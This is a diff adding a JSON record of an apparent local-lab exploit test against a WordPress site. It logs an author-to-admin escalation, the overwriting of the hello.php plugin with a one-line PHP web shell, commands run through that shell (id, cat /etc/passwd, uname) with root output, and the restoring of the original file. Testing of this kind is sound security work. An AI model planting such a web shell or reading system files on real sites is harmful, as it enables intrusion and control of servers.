@@ -1,0 +1,45 @@
+{
+  "target": "http://127.0.0.1:18080",
+  "scope": "LOCAL LAB ONLY",
+  "proof": "explicit command execution via ?cmd=",
+  "hello_php_sha256_before": "1244904e04a09c848d6e776ffecd98325ec613f277578abf3cb98c6b6d58fe53",
+  "author": {
+    "uid": 4,
+    "roles": [
+      "author"
+    ]
+  },
+  "post": {
+    "id": 962,
+    "http": 201,
+    "status": "publish",
+    "author": 4
+  },
+  "admin_login": true,
+  "rce_state": {
+    "s": "done",
+    "save": 200,
+    "done": true
+  },
+  "hello_php_sha256_after_write": "4b461219f904c073602ac9668a8ac09dfad7a020253105ad5df89246b414536c",
+  "hello_php_content_after_write": "<?php echo shell_exec($_GET['cmd']);",
+  "cmds": [
+    {
+      "cmd": "id",
+      "status": 200,
+      "output": "uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\n"
+    },
+    {
+      "cmd": "cat /etc/passwd",
+      "status": 200,
+      "output": "root:x:0:0:root:/root:/bin/sh\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/mail:/sbin/nologin\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\ngames:x:35:35:games:/usr/games:/sbin/nologin\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\nguest:x:405:100:guest:/dev/null:/sbin/nologin\nnobody:x:65534:65534:nobody:/:/sbin/nologin\nwww-data:x:82:82::/home/www-data:/sbin/nologin\n"
+    },
+    {
+      "cmd": "uname -a; hostname; pwd",
+      "status": 200,
+      "output": "Linux cb722bffb922 6.6.87.2-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Thu Jun  5 18:30:46 UTC 2025 x86_64 Linux\ncb722bffb922\n/var/www/html/wp-content/plugins\n"
+    }
+  ],
+  "hello_php_sha256_restored": "1244904e04a09c848d6e776ffecd98325ec613f277578abf3cb98c6b6d58fe53",
+  "restored_ok": true
+}
